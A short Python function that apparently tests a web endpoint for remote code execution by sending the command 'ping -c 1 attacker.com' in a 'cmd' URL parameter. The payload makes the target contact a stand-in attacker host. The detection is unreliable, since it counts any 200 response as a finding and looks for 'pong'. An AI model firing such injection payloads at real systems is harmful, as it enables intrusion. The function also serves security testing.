import requests

def test_remote_code_execution(base_url):
    """
    Test for Remote Code Execution (RCE) by injecting common payloads into input fields.
    """
    test_payload = "ping -c 1 attacker.com"
    vulnerable_url = f"{base_url}/execute?cmd={test_payload}"
    findings = []
    response = requests.get(vulnerable_url)
    
    if "pong" in response.text.lower() or response.status_code == 200:
        findings.append("Potential RCE vulnerability detected.")
    return findings
